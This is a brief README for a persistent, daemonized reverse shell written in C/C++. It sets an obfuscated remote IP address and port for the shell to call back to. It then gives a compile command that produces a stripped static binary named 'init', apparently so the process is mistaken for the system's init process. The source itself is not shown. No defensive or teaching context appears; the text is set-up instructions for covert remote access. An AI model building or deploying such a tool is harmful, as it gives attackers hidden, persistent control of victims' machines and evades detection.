### persistent daemonizec reverse shell


Change with your public IP and open port
```c
#define REMOTE_ADDR OBFUSCATE("207.46.148.7")
#define REMOTE_PORT 5069
```

compile with
```bash
g++ daemon_shell.cpp -O3 -march=native -fPIC -g -s -static -o ./init
```

output binary will be names init :)
